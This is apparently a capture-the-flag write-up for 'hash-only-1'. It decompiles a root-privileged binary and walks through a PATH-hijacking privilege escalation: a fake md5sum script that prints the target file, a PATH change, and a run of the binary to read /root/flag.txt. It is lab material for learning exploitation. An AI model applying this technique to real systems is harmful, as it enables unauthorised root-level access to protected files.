# hash-only-1

[decompiling](https://dogbolt.org/) the binary gives:

```cpp
setgid(0);
setuid(0);
// ...
system("/bin/bash -c 'md5sum /root/flag.txt'");
```

system() call is made after elevating privileges to root...

Create a malicious `md5sum` script in `/home/ctf-player/`:

```bash
#!/bin/bash
cat "$1"
```

Give permissions, modify PATH and run the binary:

```shell
chmod 777 ./md5sum
export PATH=/home/ctf-player:$PATH
./flaghasher
```
